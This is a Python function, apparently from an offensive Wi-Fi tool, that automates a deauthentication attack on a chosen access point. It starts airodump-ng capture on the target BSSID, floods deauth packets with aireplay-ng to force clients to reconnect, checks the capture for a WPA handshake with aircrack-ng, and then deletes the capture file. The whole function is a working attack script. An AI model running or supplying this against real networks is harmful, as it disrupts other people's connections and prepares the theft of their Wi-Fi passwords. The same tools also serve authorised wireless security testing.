def run_targeted_scan(bssid, channel, interface):
    """Launch focused scan + deauth attack, then check for handshake."""
    # Ask for deauth count
    try:
        count = input("[?] Number of deauth packets to send (default 20): ").strip()
        if count == "":
            count = "20"
        else:
            count = int(count)
            count = str(count)
    except ValueError:
        count = "20"
        print("[!] Invalid input, using default 20.")

    # Prepare capture filenames
    cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
    cap_file = f"{cap_prefix}-01.cap"

    # Remove old files
    for f in [cap_file]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    # Start airodump-ng in the background
    cmd_airodump = [
        'sudo', 'airodump-ng',
        '--bssid', bssid,
        '-c', channel,
        '--write', cap_prefix,
        '--output-format', 'pcap',
        interface
    ]
    print(f"\n[+] Starting capture: {' '.join(cmd_airodump)}")
    airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    # Send deauth packets – capture output and print cleanly
    cmd_deauth = [
        'sudo', 'aireplay-ng',
        '-0', count,
        '-a', bssid,
        '--ignore-negative-one',
        interface
    ]
    print(f"\n[+] Sending deauth packets: {' '.join(cmd_deauth)}")
    print("[+] Deauth progress:")
    
    # Use Popen to read output line by line and print with a prefix
    deauth_proc = subprocess.Popen(cmd_deauth,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   text=True,
                                   bufsize=1)
    
    for line in deauth_proc.stdout:
        line = line.strip()
        if line:
            print(f"    {line}")   # indent for clarity
    deauth_proc.wait()

    # Wait a few seconds for client reconnection
    print("[+] Waiting 5 seconds for potential reconnection...")
    time.sleep(5)

    # Stop airodump-ng
    print("[+] Stopping capture...")
    airo_proc.terminate()
    time.sleep(1)
    if airo_proc.poll() is None:
        airo_proc.kill()

    # Analyse the capture
    if os.path.exists(cap_file):
        print(f"\n[+] Analysing {cap_file} for handshake...")
        try:
            aircmd = ['aircrack-ng', '-b', bssid, cap_file]
            result = subprocess.run(aircmd, capture_output=True, text=True)
            output = result.stdout + result.stderr

            if 'WPA (1 handshake)' in output:
                print("\033[92m\n[✅] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
            elif 'WPA (0 handshake)' in output:
                print("\033[93m\n[!] No handshake found in the capture.\033[0m")
            else:
                print("\n[!] Could not determine handshake status. Try longer capture or stronger deauth.")
        except Exception as e:
            print(f"[-] Error analysing capture: {e}")
    else:
        print("[-] No capture file found. Something went wrong.")

    # Delete capture files automatically (no prompt)
    for f in [cap_file]:
        try:
            os.remove(f)
        except:
            pass
    print("[+] Capture files cleaned up.")
